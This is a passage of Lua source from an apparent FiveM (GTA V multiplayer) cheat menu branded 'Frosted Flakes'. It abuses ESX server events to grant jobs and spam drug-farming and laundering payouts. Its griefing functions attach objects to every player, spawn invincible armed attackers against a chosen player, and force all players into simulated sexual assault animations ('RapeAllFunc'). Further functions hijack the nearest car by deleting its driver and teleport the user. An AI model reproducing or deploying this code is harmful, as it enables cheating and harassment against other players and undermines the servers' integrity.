                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'taxi',
                    3,
                    'hire'
                )
            end
        )
    end
end

function AmbulancePlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'ambulance',
                    3,
                    'hire'
                )
            end
        )
    end
end

function PolicePlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'police',
                    3,
                    'hire'
                )
            end
        )
    end
end

function MecanoPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'mecano',
                    3,
                    'hire'
                )
            end
        )
    end
end

function bananapartyall()
    Citizen.CreateThread(
        function()
            for i = 0, 128 do
                local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    bH,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bI,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bJ,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    )
end

function RespawnPed(ped, bK, bL)
    SetEntityCoordsNoOffset(ped, bK.x, bK.y, bK.z, false, false, false, true)
    NetworkResurrectLocalPlayer(bK.x, bK.y, bK.z, bL, true, false)
    SetPlayerInvincible(ped, false)
    TriggerEvent('playerSpawned', bK.x, bK.y, bK.z)
    ClearPedBloodDamage(ped)
end
local function bM(ad)
    local bN = NetworkGetNetworkIdFromEntity(ped)
    local bO = 0
    NetworkRequestControlOfNetworkId(bN)
    while not NetworkHasControlOfNetworkId(bN) do
        Citizen.Wait(1)
        NetworkRequestControlOfNetworkId(bN)
        bO = bO + 1
        if bO == 5000 then
            Citizen.Trace('Control failed')
            break
        end
    end
end
local function bP(bQ, bR)
    for i = 0, 10 do
        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        RequestModel(GetHashKey(bQ))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(bQ)) then
            local ped =
                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and
                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false)
            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                bM(ped)
                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                SetEntityInvincible(ped, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
end

function RapeAllFunc()
    Citizen.CreateThread(
        function()
            for i = 0, 128 do
                RequestModelSync('a_m_o_acult_01')
                RequestAnimDict('rcmpaparazzo_2')
                while not HasAnimDictLoaded('rcmpaparazzo_2') do
                    Citizen.Wait(0)
                end
                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                    local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
                    while not NetworkHasControlOfEntity(veh) do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(0)
                    end
                    SetEntityAsMissionEntity(veh, true, true)
                    DeleteVehicle(veh)
                    DeleteEntity(veh)
                end
                count = -0.2
                for b = 1, 3 do
                    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                    SetEntityAsMissionEntity(bS, true, true)
                    AttachEntityToEntity(
                        bS,
                        GetPlayerPed(i),
                        4103,
                        11816,
                        count,
                        0.00,
                        0.0,
                        0.0,
                        0.0,
                        0.0,
                        false,
                        false,
                        false,
                        false,
                        2,
                        true
                    )
                    ClearPedTasks(GetPlayerPed(i))
                    TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetPedKeepTask(bS)
                    TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetEntityInvincible(bS, true)
                    count = count - 0.4
                end
            end
        end
    )
end
local function bT()
    local bU = KeyboardInput('Enter X pos', '', 100)
    local bV = KeyboardInput('Enter Y pos', '', 100)
    local bW = KeyboardInput('Enter Z pos', '', 100)
    if bU ~= '' and bV ~= '' and bW ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1)
            av('~g~Teleported to coords!', false)
        end
    else
        av('~b~Invalid coords!', true)
    end
end
local function bX()
    local name = KeyboardInput('Enter Blip Name', '', 100)
    if name == '' then
        av('~b~Invalid Blip Name!', true)
        return bX()
    else
        local bU = KeyboardInput('Enter X pos', '', 100)
        local bV = KeyboardInput('Enter Y pos', '', 100)
        local bW = KeyboardInput('Enter Z pos', '', 100)
        if bU ~= '' and bV ~= '' and bW ~= '' then
            local bY = {
                {
                    colour = 75,
                    id = 84
                }
            }
            for _, bZ in pairs(bY) do
                bZ.blip = AddBlipForCoord(bU + 0.5, bV + 0.5, bW + 0.5)
                SetBlipSprite(bZ.blip, bZ.id)
                SetBlipDisplay(bZ.blip, 4)
                SetBlipScale(bZ.blip, 0.9)
                SetBlipColour(bZ.blip, bZ.colour)
                SetBlipAsShortRange(bZ.blip, true)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(name)
                EndTextCommandSetBlipName(bZ.blip)
            end
        else
            av('~b~Invalid coords!', true)
        end
    end
end
local function b_()
    local ax = GetPlayerPed(-1)
    local c0 = GetEntityCoords(ax, true)
    local c1 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 4)
    local c2 = GetEntityCoords(c1, true)
    local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384)
    local c4 = GetEntityCoords(c3, true)
    av('~y~Wait...', false)
    Citizen.Wait(1000)
    if c1 == 0 and c3 == 0 then
        av('~b~No Vehicle Found', true)
    elseif c1 == 0 and c3 ~= 0 then
        if IsVehicleSeatFree(c3, -1) then
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        else
            local c5 = GetPedInVehicleSeat(c3, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 == 0 then
        if IsVehicleSeatFree(c1, -1) then
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        else
            local c5 = GetPedInVehicleSeat(c1, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 ~= 0 then
        if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c1, -1) then
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            else
                local c5 = GetPedInVehicleSeat(c1, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            end
        elseif Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) > Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c3, -1) then
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            else
                local c5 = GetPedInVehicleSeat(c3, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            end
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    end
end
-- Discord presenece
    Citizen.CreateThread(function()
        while discordPresence do
            --This is the Application ID (Replace this with you own)
            SetDiscordAppId(625398226522079261)
    
            --Here you will have to put the image name for the "large" icon.
            SetDiscordRichPresenceAsset('quavo')
            
            --(11-11-2018) New Natives:
    
            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText('Uzywam Frosted Flakes menu')
           
            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall('quavo')
    
            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText('Uzywam Frosted Flakes menu')
    
            --It updates every one minute just in case.
            Citizen.Wait(2000)
        end
    end)
local function c6()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local c7 = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, c7)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
        wp = true
    else
        av('~b~No waypoint!', true)
    end
    local c8 = 0.0
    height = 1000.0
    while wp do
        Citizen.Wait(0)
        if wp then
            if
                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                    GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
             then
                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
                entity = GetPlayerPed(-1)
            end
            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local c9 = GetEntityCoords(entity, true)
            if c8 == 0.0 then
                height = height - 25.0
                SetEntityCoords(entity, c9.x, c9.y, height)
                bool, c8 = GetGroundZFor_3dCoord(c9.x, c9.y, c9.z, 0)
            else
                SetEntityCoords(entity, c9.x, c9.y, c8)
                FreezeEntityPosition(entity, false)
                wp = false
                height = 1000.0
                c8 = 0.0
                av('~g~Teleported to waypoint!', false)
                break
            end
        end
    end
end
local function ca()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
    else
        av('~b~~h~Model is not valid!', true)
    end
end
local function cc()
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function cd()
    SetVehicleEngineHealth(vehicle, 1000)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function ce()
    FrostedMenu.StartRC()
end
FrostedMenu.StartRC = function()
    if DoesEntityExist(FrostedMenu.Entity) then
        return
    end
    FrostedMenu.SpawnRC()
    FrostedMenu.Tablet(true)
    while DoesEntityExist(FrostedMenu.Entity) and DoesEntityExist(FrostedMenu.Driver) do
        Citizen.Wait(5)
        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(FrostedMenu.Entity), true)
        FrostedMenu.DrawInstructions(cf)
        FrostedMenu.HandleKeys(cf)
        if cf <= 3000.0 then
            if not NetworkHasControlOfEntity(FrostedMenu.Driver) then
                NetworkRequestControlOfEntity(FrostedMenu.Driver)
            elseif not NetworkHasControlOfEntity(FrostedMenu.Entity) then
                NetworkRequestControlOfEntity(FrostedMenu.Entity)
            end
        else
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 6, 2500)
        end
    end
end
FrostedMenu.HandleKeys = function(cf)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(FrostedMenu.Camera) then
            FrostedMenu.ToggleCamera(false)
        else
            FrostedMenu.ToggleCamera(true)
        end
    end
    if cf <= 3.0 then
        if IsControlJustPressed(0, 38) then
            FrostedMenu.Attach('pick')
        end
    end
    if cf < 3000.0 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 9, 1)
        end
        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 6, 2500)
        end
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(FrostedMenu.Driver, FrostedMenu.Entity, 5, 1)
        end
        if IsControlJustReleased(0, 168) then
            SetVehicleEngineOn(FrostedMenu.Entity, not GetIsVehicleEngineRunning(FrostedMenu.Entity), false, true)
        end
    end
end
FrostedMenu.DrawInstructions = function(cf)
    local cg = {
        {
            ['label'] = 'Right',
            ['button'] = '~INPUT_CELLPHONE_RIGHT~'
        },
        {
            ['label'] = 'Forward',
            ['button'] = '~INPUT_CELLPHONE_UP~'
        },
        {
            ['label'] = 'Reverse',
            ['button'] = '~INPUT_CELLPHONE_DOWN~'
        },
        {
            ['label'] = 'Left',
            ['button'] = '~INPUT_CELLPHONE_LEFT~'
        }
    }
    local ch = {
        ['label'] = 'Delete Car',
        ['button'] = '~INPUT_CONTEXT~'
    }
    local cj = {
        {
            ['label'] = 'Toggle Camera',
            ['button'] = '~INPUT_DETONATE~'
        },
        {
            ['label'] = 'Start/Stop Engine',
            ['button'] = '~INPUT_SELECT_CHARACTER_TREVOR~'
        }
    }
    if cf <= 3000.0 then
        for ck = 1, #cg do
            local cl = cg[ck]
            table.insert(cj, cl)
        end
        if cf <= 3000.0 then
            table.insert(cj, ch)
        end
    end
    Citizen.CreateThread(
        function()
            local cm = RequestScaleformMovie('instructional_buttons')
            while not HasScaleformMovieLoaded(cm) do
                Wait(0)
            end
            PushScaleformMovieFunction(cm, 'CLEAR_ALL')
            PushScaleformMovieFunction(cm, 'TOGGLE_MOUSE_BUTTONS')
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()
            for ck, cn in ipairs(cj) do
                PushScaleformMovieFunction(cm, 'SET_DATA_SLOT')
                PushScaleformMovieFunctionParameterInt(ck - 1)
                PushScaleformMovieMethodParameterButtonName(cn['button'])
                PushScaleformMovieFunctionParameterString(cn['label'])
                PopScaleformMovieFunctionVoid()
            end
            PushScaleformMovieFunction(cm, 'DRAW_INSTRUCTIONAL_BUTTONS')
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(cm, 255, 255, 255, 255)
        end
    )
end
FrostedMenu.SpawnRC = function()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        FrostedMenu.LoadModels(
            {
                GetHashKey(cb),
                68070371
            }
        )
        local co, cp =
            GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
            GetEntityHeading(PlayerPedId())
        FrostedMenu.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
        while not DoesEntityExist(FrostedMenu.Entity) do
            Citizen.Wait(5)
        end
        FrostedMenu.Driver = CreatePed(5, 68070371, co, cp, true)
        SetEntityInvincible(FrostedMenu.Driver, true)
        SetEntityVisible(FrostedMenu.Driver, false)
        FreezeEntityPosition(FrostedMenu.Driver, true)
        SetPedAlertness(FrostedMenu.Driver, 0.0)
        TaskWarpPedIntoVehicle(FrostedMenu.Driver, FrostedMenu.Entity, -1)
        while not IsPedInVehicle(FrostedMenu.Driver, FrostedMenu.Entity) do
            Citizen.Wait(0)
        end
        FrostedMenu.Attach('place')
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid !', true)
    end
end
FrostedMenu.Attach = function(aw)
    if not DoesEntityExist(FrostedMenu.Entity) then
        return
    end
    FrostedMenu.LoadModels(
        {
            'pickup_object'
        }
    )
    if aw == 'place' then
        AttachEntityToEntity(
            FrostedMenu.Entity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            3.0,
            0.0,
            0.5,
            70.0,
            0.0,
            270.0,
            1,
            1,
            0,
            0,
            2,
            1
        )
        Citizen.Wait(200)
        DetachEntity(FrostedMenu.Entity, false, true)
        PlaceObjectOnGroundProperly(FrostedMenu.Entity)
    elseif aw == 'pick' then
        if DoesCamExist(FrostedMenu.Camera) then
            FrostedMenu.ToggleCamera(false)
        end
        FrostedMenu.Tablet(false)
        Citizen.Wait(100)
        DetachEntity(FrostedMenu.Entity)
        DeleteVehicle(FrostedMenu.Entity)
        DeleteEntity(FrostedMenu.Driver)
        FrostedMenu.UnloadModels()
    end
end
FrostedMenu.Tablet = function(cq)
    if cq then
        FrostedMenu.LoadModels(
            {
                GetHashKey('prop_cs_tablet')
            }
        )
        FrostedMenu.LoadModels(
            {
                'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'
            }
        )
        Citizen.CreateThread(
            function()
                while DoesEntityExist(FrostedMenu.TabletEntity) do
                    Citizen.Wait(5)
                    if
                        not IsEntityPlayingAnim(
                            PlayerPedId(),
                            'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a',
                            'idle_a',
                            3
                        )
                     then
                    end
                end
                ClearPedTasks(PlayerPedId())
            end
        )
    else
        DeleteEntity(FrostedMenu.TabletEntity)
    end
end
FrostedMenu.ToggleCamera = function(cq)
    if not true then
        return
    end
    if cq then
        if not DoesEntityExist(FrostedMenu.Entity) then
            return
        end
        if DoesCamExist(FrostedMenu.Camera) then
            DestroyCam(FrostedMenu.Camera)
        end
        FrostedMenu.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        AttachCamToEntity(FrostedMenu.Camera, FrostedMenu.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(FrostedMenu.Camera) do
                    Citizen.Wait(5)
                    SetCamRot(FrostedMenu.Camera, GetEntityRotation(FrostedMenu.Entity))
                end
            end
        )
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(FrostedMenu.Entity), true) / 10
            )
        RenderScriptCams(1, 1, cr, 1, 1)
        Citizen.Wait(cr)
        SetTimecycleModifier('scanline_cam_cheap')
        SetTimecycleModifierStrength(2.0)
    else
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(FrostedMenu.Entity), true) / 10
            )
        RenderScriptCams(0, 1, cr, 1, 0)
        Citizen.Wait(cr)
        ClearTimecycleModifier()
        DestroyCam(FrostedMenu.Camera)
    end
end
FrostedMenu.LoadModels = function(cs)
    for ct = 1, #cs do
        local bB = cs[ct]
        if not FrostedMenu.CachedModels then
            FrostedMenu.CachedModels = {}
        end
        table.insert(FrostedMenu.CachedModels, bB)
        if IsModelValid(bB) then
            while not HasModelLoaded(bB) do
                RequestModel(bB)
                Citizen.Wait(10)
            end
        else
            while not HasAnimDictLoaded(bB) do
                RequestAnimDict(bB)
                Citizen.Wait(10)
            end
        end
    end
end
FrostedMenu.UnloadModels = function()
    for ct = 1, #FrostedMenu.CachedModels do
        local bB = FrostedMenu.CachedModels[ct]
        if IsModelValid(bB) then
            SetModelAsNoLongerNeeded(bB)
        else
            RemoveAnimDict(bB)
        end
    end
end
local function cu()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    local m = KeyboardInput('Enter the plate license you want', '', 100)
    if m ~= '' then
        SetVehicleNumberPlateText(ay, m)
    end
end

function hweed()
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
end

function tweed()
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
end

function sweed()
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
end

function hcoke()
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
end

function tcoke()
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
end

function scoke()
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
end

function hmeth()
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
end

function tmeth()
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
end

function smeth()
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
end

function hopi()
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
end

function topi()
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
end

function sopi()
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
end

function mataaspalarufe()
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
end

function matanumaispalarufe()
    TriggerServerEvent('esx_drugs:stopHarvestCoke')
    TriggerServerEvent('esx_drugs:stopTransformCoke')
    TriggerServerEvent('esx_drugs:stopSellCoke')
    TriggerServerEvent('esx_drugs:stopHarvestMeth')
    TriggerServerEvent('esx_drugs:stopTransformMeth')
    TriggerServerEvent('esx_drugs:stopSellMeth')
    TriggerServerEvent('esx_drugs:stopHarvestWeed')
    TriggerServerEvent('esx_drugs:stopTransformWeed')
    TriggerServerEvent('esx_drugs:stopSellWeed')
    TriggerServerEvent('esx_drugs:stopHarvestOpium')
    TriggerServerEvent('esx_drugs:stopTransformOpium')
    TriggerServerEvent('esx_drugs:stopSellOpium')
    av('~b~Everything is now stopped.', false)
end
local function cv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
